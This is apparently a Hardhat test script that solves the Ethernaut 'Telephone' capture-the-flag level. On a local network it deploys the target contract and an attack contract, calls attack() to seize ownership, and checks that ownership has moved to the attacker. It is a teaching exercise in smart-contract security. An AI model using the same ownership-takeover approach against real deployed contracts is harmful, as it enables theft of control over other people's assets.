import { ethers } from "hardhat";
import { expect } from "chai";
import { Telephone } from "../../typechain-types/contracts/Telephone";
import { TelephoneAttack } from "../../typechain-types/contracts/TelephoneAttack.sol";

describe("Ethernaut 4 - Telephone", function () {
  it("Should take ownership of Telephone", async function () {
    const [attacker] = await ethers.getSigners();

    const TelephoneFactory = await ethers.getContractFactory("Telephone");
    const telephone = (await TelephoneFactory.deploy()) as unknown as Telephone;
    await telephone.waitForDeployment();

    const TelephoneAttackFactory = await ethers.getContractFactory("TelephoneAttack");
    const telephoneAttack = (await TelephoneAttackFactory.deploy()) as unknown as TelephoneAttack;
    await telephoneAttack.waitForDeployment();

    await telephoneAttack.connect(attacker).attack(telephone.target as string, attacker.address);

    const newOwner = await telephone.owner();
    expect(newOwner).to.equal(attacker.address);
  });
});
